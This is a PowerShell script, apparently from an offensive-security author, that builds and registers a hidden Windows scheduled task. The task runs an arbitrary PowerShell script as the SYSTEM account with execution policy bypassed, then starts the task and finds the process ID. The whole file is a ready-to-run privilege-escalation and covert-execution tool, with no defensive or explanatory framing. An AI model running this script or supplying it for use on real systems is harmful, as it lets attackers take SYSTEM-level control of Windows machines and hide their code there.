# Author: phoogeveen aka x0xr00t
# Description: This script creates a scheduled task for privilege escalation by running a PowerShell script with the highest privileges.
# Version: 1.0

# Define parameters for task configuration
param (
    [string]$ScriptPath = "C:\Path\To\Your\Script\your-ps-code.ps1", # Path to the PowerShell script
    [string]$TaskName = "sl0ppy-PrivescTask" # Name of the scheduled task
)

# Function to check if a script exists
function Test-ScriptExistence {
    param (
        [string]$path
    )
    if (Test-Path $path) {
        return $true
    } else {
        Write-Error "The script at '$path' does not exist."
        return $false
    }
}

# Function to check if the current user has elevated (admin) rights
function Test-Elevation {
    try {
        $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
        $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
        return $currentUser.IsInRole($adminRole)
    } catch {
        Write-Error "Failed to check for elevation. Error: $_"
        return $false
    }
}

# Check if the script exists before proceeding
if (-not (Test-ScriptExistence -path $ScriptPath)) {
    Write-Error "The specified script '$ScriptPath' does not exist. Exiting."
    exit
}

# Check if the user has elevated privileges
if (-not (Test-Elevation)) {
    Write-Error "You do not have elevated privileges. This task requires administrator rights."
    exit
}

# Get the current system time
$currentDateTime = Get-Date
Write-Output "Current system time: $currentDateTime"

# Calculate the start time by adding 2 minutes to the current time
$startTime = $currentDateTime.AddMinutes(2)
Write-Output "Scheduled task will start at: $startTime"

# Format the start time as required by the XML
$formattedStartTime = $startTime.ToString("yyyy-MM-ddTHH:mm:ss")
Write-Output "Formatted start time for XML: $formattedStartTime"

# Define the XML for the scheduled task
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$formattedStartTime</Date>
    <Author>NT AUTHORITY\SYSTEM</Author>
    <URI>\$TaskName</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$formattedStartTime</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId> <!-- SYSTEM user -->
      <RunLevel>HighestAvailable</RunLevel> <!-- Highest available privilege -->
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -File "$ScriptPath"</Arguments>
      <WorkingDirectory>$([System.IO.Path]::GetDirectoryName($ScriptPath))</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

# Register the scheduled task
try {
    Register-ScheduledTask -Xml $taskXml -TaskName $TaskName -Force
    Write-Output "Scheduled task '$TaskName' registered successfully."
} catch {
    Write-Error "Failed to register the scheduled task. Error: $_"
    exit
}

# Start the scheduled task
try {
    Start-ScheduledTask -TaskName $TaskName
    Write-Output "Scheduled task '$TaskName' started successfully."
} catch {
    Write-Error "Failed to start the scheduled task. Error: $_"
    exit
}

# Wait for the task to start
Start-Sleep -Seconds 5  # Adjust sleep time as needed

# Get the process ID of the started process
$processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`*"} | Select-Object -ExpandProperty ProcessId
Write-Output "Process ID of the started process: $processId"

# Test the script with different paths (Example: change $ScriptPath for testing)
$testPaths = @("C:\Path\To\ValidScript.ps1", "C:\InvalidPath\InvalidScript.ps1")
foreach ($testPath in $testPaths) {
    Write-Output "Testing script path: $testPath"
    if (Test-ScriptExistence -path $testPath) {
        Write-Output "Script '$testPath' exists. Proceeding with task creation."
    } else {
        Write-Error "Script '$testPath' does not exist."
    }
}
